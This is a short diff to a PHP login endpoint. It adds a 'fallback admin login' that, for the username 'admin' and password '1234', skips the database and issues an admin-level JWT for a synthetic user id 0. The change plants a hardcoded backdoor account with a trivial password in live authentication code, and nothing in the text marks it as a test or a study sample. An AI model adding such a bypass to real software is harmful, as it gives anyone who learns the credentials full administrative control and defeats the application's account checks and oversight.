@@ -14,6 +14,28 @@ if ($username === '' || $password === '') {
     send_json(false, ['error' => 'Username and password are required'], null, 400);
 }
 
+// Fallback admin login (no DB record required)
+if ($username === 'admin' && $password === '1234') {
+    $perms = ['admin'];
+    $payload = [
+        'user_id' => 0,
+        'username' => 'admin',
+        'perms' => $perms,
+    ];
+    $token = jwt_encode($payload, $CONFIG['jwt_secret'], (int)$CONFIG['jwt_ttl_hours']);
+    $data_user = [
+        'id' => 0,
+        'username' => 'admin',
+        'full_name' => 'Administrator',
+        'user_type' => 'admin',
+        'permissions' => $perms,
+    ];
+    send_json(true, [
+        'token' => $token,
+        'user' => $data_user
+    ], ['server_time' => time()]);
+}
+
 $stmt = $conn->prepare("SELECT user_id, username, full_name, email, phone, user_type, is_active, password, password_hash FROM users WHERE username = ? LIMIT 1");
 $stmt->bind_param('s', $username);
 $stmt->execute();
